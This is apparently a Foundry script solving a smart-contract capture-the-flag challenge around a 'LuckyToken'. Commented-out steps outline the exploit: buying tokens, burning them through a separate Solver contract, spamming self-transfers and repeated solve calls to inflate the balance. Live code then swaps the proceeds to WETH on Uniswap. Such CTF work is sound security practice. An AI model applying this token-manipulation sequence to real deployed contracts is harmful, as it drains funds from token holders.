// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/Challenge.sol";
import "../test/Counter.t.sol";

contract CounterScript is Script {
    Challenge challenge = Challenge(0x22398e2daE97D14a847C95A08F5923be61ec5615);

    Solver solver = Solver(0x3EC2DF4A0Ede5F87227315b5b5F994ea83B87Abd);

    IUniswapV2Router01 internal constant UNISWAPV2_ROUTER =
        IUniswapV2Router01(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    function setUp() public {}

    function run() public {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        VmSafe.Wallet memory wallet = vm.createWallet(deployerPrivateKey);

        address deployer = wallet.addr;
        address player = deployer;
        console.log("deployer: %s", deployer);

        LuckyToken token = challenge.TOKEN();
        console.log("eth balance: %e", player.balance);
        console.log("token balance: %e", token.balanceOf(player));
        console.log("total MINTED %e", token.totalAmountMinted());
        console.log("total BURNED %e", token.totalAmountBurned());

        console.log("time: ", block.timestamp);
        console.log("time: ", block.number);
        vm.startBroadcast(deployerPrivateKey);

        // // STEP 0: getting some token
        // // swap uniswap for some token. swap in 90% ether for TOKEN
        // // uint256 amount = player.balance * 90 / 100;
        // uint256 amount = 0.9 ether;
        // console.log("swapAmount: %e", amount);
        // address[] memory path = new address[](2);
        // path[0] = UNISWAPV2_ROUTER.WETH();
        // path[1] = address(token);
        // UNISWAPV2_ROUTER.swapExactETHForTokens{value: amount}(0, path, player, block.timestamp + 6000);

        // console.log("after swap balance: %e", token.balanceOf(player));

        // /// STEP 1: burn enough token
        // solver = new Solver(challenge, player);
        // console.log("Solver contract: %s", address(solver));

        // token.approve(address(solver), type(uint256).max);
        // console.log("balance: %e", token.balanceOf(player));

        // solver.step1();
        // token.approve(address(player), type(uint256).max);
        // for (uint256 i = 0; i < 15; i++) {
        //     token.transferFrom(player, player, 1e1);            
        // }
        // console.log("Tx count: ", token.txCount());

        // /// STEP3: spam burn  --skip-simulation
        // solver.step2(11); //
        // console.log("step2 done");

        // /// STEP4: spam for money
        // // --skip-simulation
        // solver.solveRepeat(50);
        // solver.solveRepeat(50);
        // solver.solveRepeat(50);
        // solver.solveRepeat(50);

        // console.log("balance: %e", token.balanceOf(player));
        // console.log("balance: %e", token.balanceOf(address(solver)));

        // /// STEP5: withdraw
        token.approve(address(UNISWAPV2_ROUTER), type(uint256).max);
        IERC20(UNISWAPV2_ROUTER.WETH()).approve(address(UNISWAPV2_ROUTER), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = UNISWAPV2_ROUTER.WETH();

        
        UNISWAPV2_ROUTER.swapExactTokensForTokens(8e22, 0, path, player, block.timestamp + 6000);

        
        console.log("solved", challenge.isSolved());

        vm.stopBroadcast();
    }
}
